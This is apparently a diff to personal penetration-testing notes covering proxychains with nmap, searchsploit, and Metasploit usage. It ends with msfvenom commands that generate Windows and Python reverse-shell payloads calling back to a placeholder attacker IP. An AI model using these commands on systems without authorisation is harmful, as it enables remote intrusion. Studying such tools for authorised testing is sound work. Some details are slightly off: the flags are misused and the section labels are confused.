@@ -156,7 +156,7 @@ socks5 	127.0.0.1 9150
 ```
 * Usage
 ```
-proxychains4 curl www.example.com
+proxychains4 nmap www.example.com # Anonymous scanning the web server with nmap 
 (When using MacOS remembering to open tor browser before using proxychains)
 ```
 ### Nmap
@@ -177,8 +177,28 @@ Detect all powered-on hosts
 nmap -sP "IP"
 ```
 ### Exploitdb
-
+This is an exploit database
 ```
-
+searchsploit linux 4 priv  # Searching existing exploit about "linux kernel 4.x privilege escalation"
 ```
 ### Metasploit
+This is just an useful penetration test tool.
+* Usage
+```
+search Apache 	# Searching the vulnerability about "Apache"
+use XXXXXX    	# Using the exp
+show options  	# Show the exp options
+set XXX 		# Setting the options
+exploit			# run the exp
+```
+* Meterpreter
+This is a subservice in metasploit. It could help us create the malicious scripts.
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhost="Your IP" lport="Your Port" -f reverseshell.exe
+(Create a windows execute file for reversing shell)
+
+msfvenom -p python/meterpreter/reverse_tcp LHOST="Your IP" LPORT="Your Port" -f pyterpreter.py
+(Create a pyhton reverse shell script)
+```
+
+
